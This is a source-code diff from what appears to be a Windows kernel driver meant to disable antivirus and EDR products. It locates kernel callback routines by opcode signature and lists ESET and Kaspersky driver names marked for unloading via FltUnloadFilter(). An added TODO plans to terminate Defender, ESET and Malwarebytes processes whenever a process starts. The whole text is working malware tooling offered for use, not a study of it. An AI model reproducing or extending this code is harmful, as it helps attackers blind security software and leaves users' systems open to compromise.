@@ -17,7 +17,7 @@
 typedef enum _SYSTEM_INFORMATION_CLASS
 {
 	SystemBasicInformation = 0,
-	SystemProcessorInformation = 1,             
+	SystemProcessorInformation = 1,             // obsolete...delete
 	SystemPerformanceInformation = 2,
 	SystemTimeOfDayInformation = 3,
 	SystemPathInformation = 4,
@@ -141,10 +141,11 @@ typedef struct _SYSTEM_PROCESS_INFORMATION {
 #define SystemProcessInformationSize 1024 * 1024 * 2
 #define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
 
-BYTE PspEnumerateCallbackOpcodes[] = { 0x4C, 0x8B, 0xCA, 0x85, 0xC9, 0x74, 0x35, 0x83, 0xE9, 0x01 }; // first 10 opcodes - Might be different between windows builds
+BYTE PspEnumerateCallbackOpcodes[] = { 0x4C, 0x8B, 0xCA, 0x85, 0xC9, 0x74, 0x35, 0x83, 0xE9, 0x01 }; // first 10 opcodes
 ULONG_PTR PspEnumerateCallbackBase = 0x0;
 ULONG ntoskrnlSize = 0;
-
+//TODO: Add an initial process termination functiona that will be called at the start of each process creation callback routine 
+//	on each UNICODE_STRING image related to the AV Vendor (Defender, ESET, Malwarebytes) etc...
 
 ULONG_PTR PspCreateProcessCallbackRoutine = 0;
 ULONG_PTR PspCreateThreadCallbackRoutine = 0;
@@ -271,7 +272,7 @@ UNICODE_STRING edevmonSYS = RTL_CONSTANT_STRING(L"edevmon.sys");
 UNICODE_STRING edevmonmSYS = RTL_CONSTANT_STRING(L"edevmonm.sys");
 UNICODE_STRING eelamSYS = RTL_CONSTANT_STRING(L"eelam.sys");
 UNICODE_STRING ehdrvSYS = RTL_CONSTANT_STRING(L"ehdrv.sys");
-UNICODE_STRING ekbdfltSYS = RTL_CONSTANT_STRING(L"ekbdflt.sys"); 			// unload using FltUnloadFilter()
+UNICODE_STRING ekbdfltSYS = RTL_CONSTANT_STRING(L"ekbdflt.sys"); // unload using FltUnloadFilter()
 UNICODE_STRING epfwSYS = RTL_CONSTANT_STRING(L"epfw.sys");
 UNICODE_STRING EpfwLwfSYS = RTL_CONSTANT_STRING(L"EpfwLwf.sys");
 UNICODE_STRING EpfwWfpSYS = RTL_CONSTANT_STRING(L"EpfwWfp.sys");
@@ -279,15 +280,15 @@ UNICODE_STRING EpfwWfpSYS = RTL_CONSTANT_STRING(L"EpfwWfp.sys");
 // Kaspersky Drivers
 
 UNICODE_STRING klim6SYS = RTL_CONSTANT_STRING(L"klim6.sys");
-UNICODE_STRING klfltSYS = RTL_CONSTANT_STRING(L"klflt.sys");				// Filter Driver
+UNICODE_STRING klfltSYS = RTL_CONSTANT_STRING(L"klflt.sys");				// unload using FltUnloadFilter()
 UNICODE_STRING klelamSYS = RTL_CONSTANT_STRING(L"klelam.sys");
 UNICODE_STRING klbackupdiskSYS = RTL_CONSTANT_STRING(L"klbackupdisk.sys");
-UNICODE_STRING klbackupfltSYS = RTL_CONSTANT_STRING(L"klbackupflt.sys");		// Filter Driver
+UNICODE_STRING klbackupfltSYS = RTL_CONSTANT_STRING(L"klbackupflt.sys");	// unload using FltUnloadFilter()
 UNICODE_STRING kldiskSYS = RTL_CONSTANT_STRING(L"kldisk.sys");
-UNICODE_STRING klkbdfltSYS = RTL_CONSTANT_STRING(L"klkbdflt.sys");			// Filter Driver
-UNICODE_STRING klmoufltSYS = RTL_CONSTANT_STRING(L"klmouflt.sys");			// Filter Driver
+UNICODE_STRING klkbdfltSYS = RTL_CONSTANT_STRING(L"klkbdflt.sys");			// unload using FltUnloadFilter()
+UNICODE_STRING klmoufltSYS = RTL_CONSTANT_STRING(L"klmouflt.sys");			// unload using FltUnloadFilter()
 UNICODE_STRING klpdSYS = RTL_CONSTANT_STRING(L"klpd.sys");
-UNICODE_STRING klpnpfltSYS = RTL_CONSTANT_STRING(L"klpnpflt.sys");			// Filter Driver
+UNICODE_STRING klpnpfltSYS = RTL_CONSTANT_STRING(L"klpnpflt.sys");			// unload using FltUnloadFilter()
 UNICODE_STRING klwtpSYS = RTL_CONSTANT_STRING(L"klwtp.sys");
 UNICODE_STRING knepsSYS = RTL_CONSTANT_STRING(L"kneps.sys");
 
